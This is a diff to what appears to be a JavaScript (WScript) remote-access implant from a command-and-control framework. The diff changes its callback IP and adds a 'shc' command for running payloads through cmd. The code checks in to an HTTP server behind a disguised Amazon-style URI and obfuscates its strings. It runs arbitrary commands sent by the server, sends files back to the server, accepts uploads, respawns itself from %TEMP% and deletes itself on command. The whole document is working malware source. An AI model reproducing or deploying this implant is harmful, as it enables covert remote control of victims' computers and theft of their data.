@@ -1,6 +1,6 @@
 //Define variables
 var ho = "192.168."
-var me = "0.189"
+var me = "8.17"
 var p0rt= "8080"
 var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var proto = "ht"+"tp"+":/"+"/"
@@ -19,7 +19,6 @@ var temp = runner.ExpandEnvironmentStrings("%TE" +"MP%");
 var cs = runner.ExpandEnvironmentStrings("%C"+  "OmSP"    +"Ec%");
 var un = runner.ExpandEnvironmentStrings("%US"+  "ER"+"NA"+  "ME%");
 
-var retval = ""
 var id = Math.floor(Math.random() * 9999999999).toString()
 var type = "js"
 
@@ -138,6 +137,7 @@ while(true)
 {
   try
   {
+    var retval = ""
     var checkin = '{"type": "'+type+'","id": '+id+',"un": "'+un+'"}';
     var serverMsg = post(home, checkin);
 	  var jsondata = "{" + serverMsg.split("{")[1].split("\n")[0]
@@ -146,59 +146,62 @@ while(true)
 
     if(jsObject.cmnd)
     {
-		var rettype = "retval"
-	    //kill
-	    if(jsObject.cmnd == "quit") {
+      var rettype = "retval"
+      //kill
+      if(jsObject.cmnd == "quit") {
         if(fso.FileExists(selfpath)) {
           fso.DeleteFile(selfpath, true)
         }
-		    WScript.Quit(1);
-	    }
+        WScript.Quit(1);
+      }
 
-	    //spawn: writes js to %TEMP%
+      //spawn: writes js to %TEMP%
       else if(jsObject.cmnd == "spawn") {
-		    fd = fso.CreateTextFile(temp+"\\"+id+".js")
-		    fd.WriteLine(selfdata)
-		    fd.close()
-		    runner.Run(temp+"\\"+id+".js")
-		    retval = "[+] Spawn success..."
-	    }
+        fd = fso.CreateTextFile(temp+"\\"+id+".js")
+        fd.WriteLine(selfdata)
+        fd.close()
+        runner.Run(temp+"\\"+id+".js")
+        retval = "[+] Spawn success..."
+      }
 
       //psh and cs
       //duplicate code here and cmnd... :(
-      else if((jsObject.cmnd.split(" ")[0] == "psh") || (jsObject.cmnd.split(" ")[0] == "cs")) {
+      else if((jsObject.cmnd.split(" ")[0] == "psh") || (jsObject.cmnd.split(" ")[0] == "cs") || (jsObject.cmnd.split(" ")[0] == "shc")) {
          fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
          msb = jsObject.cmnd.split(" ")[1]
          msbdata = b64d(jsObject.cmnd.split(" ")[2], "txt")
          fd.WriteLine(msbdata)
          fd.close()
-         runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt" + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
-		     if(fso.FileExists(temp + "\\__" + id + ".txt")) {
-		       fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
-	         retval = fd.ReadAll()
-		       fd.close()
-		       fso.DeleteFile(temp + "\\__" + id + ".txt", true)
-		     }
-		     else {
-		       retval = "[!] Error getting output"
-	       }
+         if(jsObject.cmnd.split(" ")[0] == "shc") {
+           runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt", 0, true)
+           retval = "[*] Shc cmnd appeared successful"
+         }
+         else {
+           runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt" + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
+         }
+         if(fso.FileExists(temp + "\\__" + id + ".txt")) {
+           fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
+           retval = fd.ReadAll()
+           fd.close()
+           fso.DeleteFile(temp + "\\__" + id + ".txt", true)
+         }
         if(fso.FileExists(temp + "\\" + id + ".txt")) {
           fso.DeleteFile(temp + "\\" + id + ".txt", true)
         }
       }
 	  
-	  	else if(jsObject.cmnd.split(" ")[0] == "dl") {
-	      var array = jsObject.cmnd.split(" ")
-		  array.shift() //Cuts off the first element in the array
-		  var filepath = array.join(" ")
-	      if(fso.FileExists(filepath)) {
-		    retval = readbinfile(filepath)
-		    rettype = "dl"
-		}
-		else {
-		  retval = "[!] Could not read file: " + filepath
-		}
-	  }
+      else if(jsObject.cmnd.split(" ")[0] == "dl") {
+        var array = jsObject.cmnd.split(" ")
+        array.shift() //Cuts off the first element in the array
+        var filepath = array.join(" ")
+        if(fso.FileExists(filepath)) {
+          retval = readbinfile(filepath)
+          rettype = "dl"
+        }
+        else {
+          retval = "[!] Could not read file: " + filepath
+        }
+      }
 
 	  	else if(jsObject.cmnd.split(" ")[0] == "up") {
                   try {
@@ -219,14 +222,17 @@ while(true)
 	    else {
         runner.Run(cs +" /q /c " + jsObject.cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
 		    if(fso.FileExists(temp + "\\__" + id + ".txt")) {
-		      fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
-	        retval = fd.ReadAll()
-		      fd.close()
-		      fso.DeleteFile(temp + "\\__" + id + ".txt", true)
+                      try {
+		        fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
+                        retval = fd.ReadAll()
+		        fd.close()
+		        fso.DeleteFile(temp + "\\__" + id + ".txt", true)
+                      }
+                      catch (e) { }
 		    }
-		    else {
-		      retval = "[!] Error getting output"
-	      }
+      }
+      if(retval == "") {
+        retval = "[*] No results to return or error getting result data"
       }
       var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","'+rettype+'":"'+b64e(retval)+'"}';
       jsObject.cmnd = ""
